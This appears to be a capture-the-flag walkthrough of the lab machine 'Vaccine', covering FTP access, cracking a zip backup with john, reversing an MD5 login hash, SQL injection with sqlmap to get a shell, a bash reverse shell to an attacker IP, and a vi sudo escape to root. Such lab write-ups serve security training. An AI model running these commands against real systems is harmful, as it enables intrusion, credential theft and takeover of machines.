# Vaccine (starting point)

## Enumeration

> FTP, ssh, Apache web server (with auth)

## Exploration

We got FTP credentials from the previous machine:
`ftpuser mc@F1l3ZilL4`, gives us access.

The content is a single zip file, encrypted.

## Password Bruteforcing

### Open The Backup

The content of the zip is most likely the source code of the index page served
by the Apache service.

We can use its `style.css` to check for bruteforce success:

```bash
zip2john -a style.css backups.zip > hash
john --session=zipfile \
  --wordlist=/usr/share/wordlists/passwords/rockyou-75.txt
  hash
```

> 741852963

### Guess The Login Page Credentials

The index.php shows that the password is against a MD5 hash:

```php
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")
```
A simple google search (rainbow tables) gives us `qwerty789`.

## SQL Injection

The page is clearly an html view of a SQL table, so let's try SQLi.

```bash
sqlmap -u http://10.10.10.46/dashboard.php?search= \
  --cookie="PHPSESSID=7eb7u026276nlqk0s15vv34bkl" --os-shell
```

> Postgres with multiple vulnerabilities

sqlmap gives us a shell from the get-go so we can step-up with a reverse bash:

```bash
nc -lvnp 4444 -s 10.10.16.59
bash -c 'bash -i >& /dev/tcp/10.10.16.59/4444 0>&1'
```

## Lateral Movement

Exploring, we open `/var/www/html/dashboard.php` and find the credentials for
the user `postgres`:

> `postgres` is allowed to ssh!

## Privilege Escalation

`sudo -l` shows that `postgres` can issue one special command:

> `/bin/vi /etc/postgresql/11/main/pg_hba.conf`.

And in `vi` you can execute any command with `:!command`

> including `:!/bin/bash`!


